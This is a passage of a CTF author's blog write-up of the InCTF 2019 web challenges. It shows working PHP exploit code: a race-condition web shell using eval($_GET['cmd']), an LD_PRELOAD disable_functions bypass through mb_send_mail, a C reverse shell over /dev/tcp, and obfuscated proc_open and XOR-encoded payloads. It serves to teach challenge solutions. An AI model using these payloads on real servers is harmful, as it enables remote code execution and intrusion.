class="literal">TRUE</span>) &#123;</span><br><span class="line">    <span class="variable">$zip</span>-&gt;extractTo(<span class="variable">$path</span>);</span><br><span class="line">    <span class="variable">$zip</span>-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CheckDir</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$files</span> = scandir(<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="variable">$filepath</span> = <span class="string">&quot;<span class="subst">$path</span>/<span class="subst">$file</span>&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (is_file(<span class="variable">$filepath</span>)) &#123;</span><br><span class="line">            <span class="variable">$parts</span> = pathinfo(<span class="variable">$file</span>);</span><br><span class="line">            <span class="variable">$ext</span> = strtolower(<span class="variable">$parts</span>[<span class="string">&#x27;extension&#x27;</span>]);</span><br><span class="line">            <span class="keyword">if</span> (strpos(<span class="variable">$ext</span>, <span class="string">&#x27;php&#x27;</span>) === <span class="literal">false</span> &amp;&amp;</span><br><span class="line">                strpos(<span class="variable">$ext</span>, <span class="string">&#x27;pl&#x27;</span>) === <span class="literal">false</span> &amp;&amp;</span><br><span class="line">                strpos(<span class="variable">$ext</span>, <span class="string">&#x27;py&#x27;</span>) === <span class="literal">false</span> &amp;&amp;</span><br><span class="line">                strpos(<span class="variable">$ext</span>, <span class="string">&#x27;cgi&#x27;</span>) === <span class="literal">false</span> &amp;&amp;</span><br><span class="line">                strpos(<span class="variable">$ext</span>, <span class="string">&#x27;asp&#x27;</span>) === <span class="literal">false</span> &amp;&amp;</span><br><span class="line">                strpos(<span class="variable">$ext</span>, <span class="string">&#x27;js&#x27;</span>) === <span class="literal">false</span> &amp;&amp;</span><br><span class="line">                strpos(<span class="variable">$ext</span>, <span class="string">&#x27;rb&#x27;</span>) === <span class="literal">false</span> &amp;&amp;</span><br><span class="line">		strpos(<span class="variable">$ext</span>, <span class="string">&#x27;htaccess&#x27;</span>) === <span class="literal">false</span> &amp;&amp;</span><br><span class="line">                strpos(<span class="variable">$ext</span>, <span class="string">&#x27;jar&#x27;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">                @chmod(<span class="variable">$filepath</span>, <span class="number">0666</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                @chmod(<span class="variable">$filepath</span>, <span class="number">0666</span>);    <span class="comment">// just in case the unlink fails for some reason</span></span><br><span class="line">                unlink(<span class="variable">$filepath</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="variable">$file</span> != <span class="string">&#x27;.&#x27;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&#x27;..&#x27;</span> &amp;&amp; is_dir(<span class="variable">$filepath</span>)) &#123;</span><br><span class="line">            CheckDir(<span class="variable">$filepath</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>CheckDir</code> is the function to check and remove malicious files. And <code>ExtractZipFile</code> functions will extract the files from zip. So, let’s see how these functions are called.<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ExtractZipFile(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$SANDBOX</span>);</span><br><span class="line">CheckDir(<span class="variable">$SANDBOX</span>);</span><br></pre></td></tr></table></figure><br>Do you see the problem here? <strong>Race-Condition</strong>. So using the Race Condition you can execute PHP files before it gets deleted, so you can see that it’s too much unstable. Not everytime for running a PHP code I can make race-codition.<br>So we need to find a stable method from where you can quey PHP codes.<br>So here is the idea, what if you can put file in parent directory because the function <code>CheckDir</code> checks for malicious file in current directory(recursively).<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$payload</span> = <span class="string">&#x27;&lt;?php eval($_GET[\&#x27;cmd\&#x27;]); ?&gt; &#x27;</span>;</span><br><span class="line">file_put_contents(<span class="string">&quot;../a.php&quot;</span>,<span class="variable">$payload</span>);</span><br></pre></td></tr></table></figure><br>So putting this file using Race-Condition will give us to execute PHP codes.</p>
<h4 id="Unintended-Step-for-the-same-stage"><a href="#Unintended-Step-for-the-same-stage" class="headerlink" title="Unintended Step for the same stage:"></a>Unintended Step for the same stage:</h4><p>The unintended was to upload <code>.pht</code> files because server treats them as <code>php</code> file.</p>
<p><strong>Now from both ways you can create a stable file from where you can execute PHP code.</strong></p>
<p>If you see the <code>phpinfo()</code>, you can see the disable_function list:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,error_log,system,exec,shell_exec,popen,proc_open,passthru,link,symlink,syslog,imap_open,ld,mail,fread,fopen,file_get_contents,readfile,chdir</span><br></pre></td></tr></table></figure></p>
<p>Here, you can see that <code>putenv</code> is not there, but all the majorly known function like, <code>error_log</code> and <code>mail</code> are blocked. And also PHP-Imagick library is not there.<br>But there is function which works same as <code>mail</code> is <code>mb_send_mail</code> (For this to be working <code>mbstring</code> module should be there).<br>This function came up when I was fuzzing the php-functions to see which all functions calls execve internally. We(I and <a target="_blank" rel="noopener" href="https://twitter.com/__c3rb3ru5__">@__c3rb3ru5__</a>) implemented a <strong>dumb</strong> fuzzer for that. We will be releasing a blog soon with the result of our small research.  </p>
<p>So final exploit:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#For getting consistent php code execution</span></span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&#x27;&lt;?php eval($_GET[\&#x27;cmd\&#x27;]); ?&gt; &#x27;</span>;</span><br><span class="line">file_put_contents(<span class="string">&quot;../a.php&quot;</span>,<span class="variable">$payload</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#For bypassing disable_function and getting RCE</span></span><br><span class="line">rename(<span class="string">&quot;./exploit.txt&quot;</span>,<span class="string">&quot;/tmp/exploit.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">chmod(<span class="string">&quot;/tmp/exploit.txt&quot;</span>,<span class="number">0755</span>);</span><br><span class="line">putenv(<span class="string">&quot;LD_PRELOAD=/tmp/exploit.txt&quot;</span>);</span><br><span class="line">mb_send_mail(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>The exploit.c file:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uid_t</span> <span class="title">getuid</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">	unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;bash -c \&quot;sh -i &gt;&amp; /dev/tcp/127.0.0.1/1234 0&gt;&amp;1\&quot;&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>You can get here the exploit for Race-Condition <a target="_blank" rel="noopener" href="https://github.com/tarunkant/CTF/blob/master/InCTF2019/Copy-Cat/exploit2.py">here</a>.</p>
<h2 id="PHP-Series"><a href="#PHP-Series" class="headerlink" title="PHP Series"></a>PHP Series</h2><p>The PHP series was related to PHP-internals.</p>
<h3 id="PHP-1"><a href="#PHP-1" class="headerlink" title="PHP+1"></a>PHP+1</h3><p>In this challenge I didn’t check if the input contains the blacklisted keyword.<br>If you check for disable_functions, you will found that <code>proc_open</code> was unblocked.<br>So there can be several solutions for this stage, here is one:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$x=(ch).(r);$k=$x(95);$l=$x(47);$a=(pr).(oc).$k.(op).(en);$b=($l.readFlag);$c=(p).(i).(pe);$d=r;$e=w;$f=(p).(i).(pes);$g=(pri).(nt).$k.(r);$h=(str).(eam).$k.(ge).(t).$k.(con).(tents);$i=(arra).(y).$k.(sh).(ift);$j=(arra).(y).$k.(sl).(ice);$z=$a($b,array(array($c,$d),array($c,$e),array($c,$e)),$$f);$g($h($i($j($$f,1,2))));</span><br></pre></td></tr></table></figure></p>
<h3 id="PHP-1-5"><a href="#PHP-1-5" class="headerlink" title="PHP+1.5"></a>PHP+1.5</h3><p>Here the blacklist check was being done, but no check on length of input. So again:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$x=(ch).(r);$k=$x(95);$l=$x(47);$a=(pr).(oc).$k.(op).(en);$b=($l.readFlag);$c=(p).(i).(pe);$d=r;$e=w;$f=(p).(i).(pes);$g=(pri).(nt).$k.(r);$h=(str).(eam).$k.(ge).(t).$k.(con).(tents);$i=(arra).(y).$k.(sh).(ift);$j=(arra).(y).$k.(sl).(ice);$z=$a($b,array(array($c,$d),array($c,$e),array($c,$e)),$$f);$g($h($i($j($$f,1,2))));</span><br></pre></td></tr></table></figure></p>
<h3 id="PHP-2"><a href="#PHP-2" class="headerlink" title="PHP+2"></a>PHP+2</h3><p>In this challenge the <code>proc_open</code> was blocked. This challenge was based on 1day exploit, you can see the actual PoC <a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=77843">here</a>.<br> You can also get the exploit code <a target="_blank" rel="noopener" href="https://github.com/mm0r1/exploits/tree/master/php-json-bypass">here</a> (Thanks to OpenToAll for this). OpenToAll was the only team to solve this challenge.</p>
<p>If you are wondering how we can put this big file under the given condition of length constraint, here is the snippet:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def e(s):</span><br><span class="line">    return &#x27;&#x27;.join([chr(ord(c) ^ 0xff) for c in s]) + &#x27;^&#x27; + &#x27;\xff&#x27; * len(s)</span><br><span class="line"></span><br><span class="line">p = &#x27;$p=%s;&#x27; % e(&#x27;_POST&#x27;)</span><br><span class="line">p += &#x27;$l=%s;$n=%s;$m=$n(%s,$l($$p));$m();&#x27; % (e(&#x27;current&#x27;), e(&#x27;create_function&#x27;), e(&#x27;$x&#x27;))</span><br></pre></td></tr></table></figure></p>
<h3 id="PHP-2-5"><a href="#PHP-2-5" class="headerlink" title="PHP+2.5"></a>PHP+2.5</h3><p>In this challenge <code>prroc_open</code> was unblocked. The intended solution was to find a Segmentation Fault, and using that upload the file and using Race-Condition get the shell.<br>If you are not familiar with this, RCE through Segfault+LFI, you can read <a target="_blank" rel="noopener" href="https://spyclub.tech/2018/12/21/one-line-and-return-of-one-line-php-writeup/">this blog</a>.<br>As of my PoC, you can visit to this <a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=78583">bug</a>.  </p>
<p>The unintended solution was to find a working payload which is less than 100 length and that we found in PHP+2 itself.</p>
<p>I hope you get fun solving my InCTF challenges and may this blog help you to understand the challenge solutions.</p>

  </div>
</article>

    <div class="blog-post-comments">
        <div id="disqus_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Blogs</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://github.com/tarunkant/SpyTools">Projects</a></li>
         
          <li><a href="/resume/resume.pdf">Resume</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#GoSQLv2"><span class="toc-number">1.</span> <span class="toc-text">GoSQLv2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Trick-1"><span class="toc-number">1.1.</span> <span class="toc-text">Trick-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Trick-2"><span class="toc-number">1.2.</span> <span class="toc-text">Trick-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Trick-3"><span class="toc-number">1.3.</span> <span class="toc-text">Trick-3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Trick-4"><span class="toc-number">1.4.</span> <span class="toc-text">Trick-4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Trick-5"><span class="toc-number">1.5.</span> <span class="toc-text">Trick-5</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Copy-Cat"><span class="toc-number">2.</span> <span class="toc-text">Copy-Cat</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass-SQLi"><span class="toc-number">2.1.</span> <span class="toc-text">Bypass SQLi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Trcik-6"><span class="toc-number">2.2.</span> <span class="toc-text">Trcik-6</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Intended-Step-for-this-stage"><span class="toc-number">2.2.1.</span> <span class="toc-text">Intended Step for this stage:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unintended-Step-for-the-same-stage"><span class="toc-number">2.2.2.</span> <span class="toc-text">Unintended Step for the same stage:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-Series"><span class="toc-number">3.</span> <span class="toc-text">PHP Series</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-1"><span class="toc-number">3.1.</span> <span class="toc-text">PHP+1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-1-5"><span class="toc-number">3.2.</span> <span class="toc-text">PHP+1.5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-2"><span class="toc-number">3.3.</span> <span class="toc-text">PHP+2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-2-5"><span class="toc-number">3.4.</span> <span class="toc-text">PHP+2.5</span></a></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://tarunkant.github.io/2019/10/15/inctf2019-web-challenges-writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://tarunkant.github.io/2019/10/15/inctf2019-web-challenges-writeup/&text=InCTF-2019 Web challenges writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://tarunkant.github.io/2019/10/15/inctf2019-web-challenges-writeup/&title=InCTF-2019 Web challenges writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://tarunkant.github.io/2019/10/15/inctf2019-web-challenges-writeup/&is_video=false&description=InCTF-2019 Web challenges writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=InCTF-2019 Web challenges writeup&body=Check out this article: https://tarunkant.github.io/2019/10/15/inctf2019-web-challenges-writeup/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://tarunkant.github.io/2019/10/15/inctf2019-web-challenges-writeup/&title=InCTF-2019 Web challenges writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://tarunkant.github.io/2019/10/15/inctf2019-web-challenges-writeup/&title=InCTF-2019 Web challenges writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://tarunkant.github.io/2019/10/15/inctf2019-web-challenges-writeup/&title=InCTF-2019 Web challenges writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://tarunkant.github.io/2019/10/15/inctf2019-web-challenges-writeup/&title=InCTF-2019 Web challenges writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://tarunkant.github.io/2019/10/15/inctf2019-web-challenges-writeup/&name=InCTF-2019 Web challenges writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2025 SpyD3r
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Blogs</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://github.com/tarunkant/SpyTools">Projects</a></li>
         
          <li><a href="/resume/resume.pdf">Resume</a></li>
         
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
</body>
</html>
<!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


<!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/main.js"></script>

<!-- search -->


<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- ad_1 -->
<ins class="adsbygoogle"
     style="display:block"
     data-ad-client="ca-pub-6813652886953741"
     data-ad-slot="9851733933"
     data-ad-format="auto"
     data-full-width-responsive="true"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script>

<!-- Google Analytics -->

    <script type="text/javascript">
        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'UA-122832343-1', 'auto');
        ga('send', 'pageview');
    </script>

<!-- Baidu Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'spyclub';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>


